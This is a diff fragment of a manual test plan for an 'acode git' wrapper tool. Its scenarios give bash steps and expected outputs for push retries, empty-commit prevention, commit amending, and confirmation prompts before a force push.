+# ⚠ Push attempt 2 failed, retrying in 200ms: Connection refused
+# ⚠ Push attempt 3 failed, retrying in 400ms: Connection refused
+# ❌ ERROR: Push failed after 3 retries
+# (Total time: > 700ms due to backoff delays)
+
+# Step 3: Restore network connectivity
+# (Remove iptables rules)
+
+# Step 4: Retry push successfully
+acode git push origin main
+
+# Expected Output:
+# ✓ Pushed to origin/main
+```
+
+### Scenario 8: Empty Commit Prevention
+
+**Objective:** Verify commit fails when nothing staged unless --allow-empty.
+
+```bash
+# Step 1: Ensure working tree clean
+git status
+
+# Expected Output: nothing to commit, working tree clean
+
+# Step 2: Try to commit with nothing staged
+acode git commit "feat: empty commit"
+
+# Expected Output:
+# ❌ ERROR: Nothing to commit
+# No staged changes found. Stage files with 'acode git add' first.
+
+# Step 3: Use --allow-empty for checkpoint commit
+acode git commit "chore: checkpoint before major refactor" --allow-empty
+
+# Expected Output:
+# ✓ [ghi789] chore: checkpoint before major refactor
+
+# Step 4: Verify empty commit created
+git log -1 --pretty=format:"%s"
+git show HEAD --stat
+
+# Expected Output:
+# chore: checkpoint before major refactor
+# (no files changed)
+```
+
+### Scenario 9: Amend Last Commit
+
+**Objective:** Verify --amend modifies most recent commit.
+
+```bash
+# Step 1: Create initial commit
+echo "v1" > file.txt
+acode git add file.txt
+acode git commit "feat: add feature"
+
+# Step 2: Get initial commit SHA
+initial_sha=\$(git rev-parse HEAD)
+echo "Initial SHA: \$initial_sha"
+
+# Step 3: Make additional changes
+echo "v2" >> file.txt
+acode git add file.txt
+
+# Step 4: Amend commit
+acode git commit "feat: add feature with enhancements" --amend
+
+# Expected Output:
+# ✓ [jkl012] feat: add feature with enhancements
+
+# Step 5: Verify SHA changed (new commit)
+new_sha=\$(git rev-parse HEAD)
+echo "New SHA: \$new_sha"
+
+# Expected: \$initial_sha != \$new_sha
+
+# Step 6: Verify file contains both changes
+cat file.txt
+
+# Expected Output:
+# v1
+# v2
+
+# Step 7: Verify only one commit (not two)
+git log --oneline -2
+
+# Expected: Shows amended commit + Initial commit (not 3 commits)
+```
+
+### Scenario 10: Force Push Protection (Destructive Operation Test)
+
+**Objective:** Verify force push requires explicit authorization and warns user.
+
+```bash
+# Step 1: Create diverged history (simulate)
+git reset --hard HEAD~1  # Move local back one commit
+echo "conflicting change" > conflict.txt
+acode git add conflict.txt
+acode git commit "feat: conflicting commit"
+
+# Step 2: Try normal push (will fail - non-fast-forward)
+acode git push origin main
+
+# Expected Output:
+# ❌ ERROR: Push rejected (non-fast-forward)
+# Remote contains commits not in local branch.
+# Suggestion: Pull and rebase, or use --force-with-lease if intentional.
+
+# Step 3: Use force-with-lease (safer than --force)
+acode git push origin main --force-with-lease
+
+# Expected Output:
+# ⚠ WARNING: Force push will overwrite remote history
+# Type 'yes' to confirm: yes
+# ✓ Pushed to origin/main (forced update)
+
+# Step 4: Verify force push succeeded
+git log origin/main -1 --pretty=format:"%s"
+
+# Expected Output: feat: conflicting commit (local commit now on remote)
+```
 
 ---
 
